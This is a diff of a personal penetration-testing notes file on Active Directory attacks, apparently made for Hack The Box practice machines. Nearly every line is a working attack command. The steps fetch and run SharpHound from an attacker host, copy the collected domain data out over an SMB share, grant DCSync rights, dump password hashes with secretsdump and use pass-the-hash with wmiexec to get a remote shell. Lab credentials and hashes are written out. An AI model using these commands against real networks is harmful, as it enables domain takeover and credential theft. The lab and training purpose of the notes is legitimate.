@@ -28,17 +28,23 @@
 27. OK now u need to transfer `Collection` scripts from the github repo to the victim.
 28. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
 29. Or directly run exe.
-30. `bloodhound-python -d htb.local -usvc-afresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161`, it dumps a zip file, get it and load it webUI.
-31. With sharphound.exe `\s.exe --domain egotistical-bank.local --ldapusername <username> --ldappassword <Password> -c all`.
-32. How to load the zip ? In attacker run `impacket-smbserver  share . -smb2support -username df -password df`
-33. Use the share from the victim `net use \\10.10.14.6\share /u:df df`. and upload `copy 20191018035324_BloodHound.zip \\10.10.14.6\share\`
-34. In Bloodhound web UI, click on admin, and check `find shortest path to `, check permissions and group permission.
-35. Dsync attack `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` ?
-36. `aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161` automates the whole process.
-37. `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161` get hashes.
-38. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
-39. Another way or privilige escalatoin `https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md`.
-40. If u have user who can see NTUSER.dat, `impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175` to get password hashes.
+```diff
++ To install bloddhound
++ apt install bloodhound
++ pip3 install bloodhound
+- bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly --dns-timeout 20
+```
+31. `bloodhound-python -d htb.local -usvc-afresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161`, it dumps a zip file, get it and load it webUI.
+32. With sharphound.exe `\s.exe --domain egotistical-bank.local --ldapusername <username> --ldappassword <Password> -c all`.
+33. How to load the zip ? In attacker run `impacket-smbserver  share . -smb2support -username df -password df`
+34. Use the share from the victim `net use \\10.10.14.6\share /u:df df`. and upload `copy 20191018035324_BloodHound.zip \\10.10.14.6\share\`
+35. In Bloodhound web UI, click on admin, and check `find shortest path to `, check permissions and group permission.
+36. Dsync attack `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` ?
+37. `aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161` automates the whole process.
+38. `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161` get hashes.
+39. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
+40. Another way or privilige escalatoin `https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md`.
+41. If u have user who can see NTUSER.dat, `impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175` to get password hashes.
 # Initial Attack Vector
 ### LLMNR Poisoning
  - Link Local Multicast Name Resolution.
